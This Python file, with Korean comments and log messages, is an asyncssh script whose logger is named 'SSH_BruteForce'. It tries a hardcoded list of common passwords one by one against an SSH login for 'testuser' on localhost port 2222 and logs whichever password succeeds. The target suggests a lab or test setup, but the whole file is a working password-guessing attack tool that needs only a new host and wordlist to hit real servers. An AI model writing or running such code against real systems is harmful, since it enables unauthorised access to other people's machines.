import asyncio
import asyncssh
import logging
import sys
import time

# 로깅 설정
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("SSH_BruteForce")

# 대상 서버 설정
HOST = "localhost"
PORT = 2222
USERNAME = "testuser"
PASSWORDS = ["pass123", "password", "admin", "123456"]  # 올바른 비밀번호 먼저 시도

async def try_ssh_login(password: str) -> bool:
    """비밀번호로 SSH 연결 시도 (알고리즘 명시적 지정)"""
    try:
        # 알고리즘 호환성 강제 설정
        conn = await asyncssh.connect(
            host=HOST,
            port=PORT,
            username=USERNAME,
            password=password,
            known_hosts=None,
            connect_timeout=15,
            encryption_algs=['aes256-ctr', 'aes192-ctr', 'aes128-ctr'],
            kex_algs=['ecdh-sha2-nistp256', 'diffie-hellman-group14-sha1'],
            mac_algs=['hmac-sha2-256', 'hmac-sha1']
        )
        
        # 연결 검증
        result = await conn.run("echo 'Login successful'", timeout=5)
        if "Login successful" in result.stdout:
            logger.info(f"성공! 비밀번호: {password}")
            await conn.close()
            return True
            
    except asyncssh.PermissionDenied:
        logger.info(f"인증 실패: {password}")
    except asyncssh.Error as e:
        logger.error(f"SSH 오류 ({password}): {str(e)}")
    except Exception as e:
        logger.exception(f"치명적 오류 ({password}): {str(e)}")
    
    return False

async def main():
    """순차적 실행으로 서버 부하 감소"""
    for idx, pwd in enumerate(PASSWORDS):
        logger.info(f"시도 #{idx+1}/{len(PASSWORDS)}: {pwd}")
        if await try_ssh_login(pwd):
            return
            
        # 서버 회복 시간 확보
        if idx < len(PASSWORDS) - 1:
            await asyncio.sleep(2)  # 2초 대기
    
    logger.error("모든 시도 실패")

if __name__ == "__main__":
    asyncio.run(main())
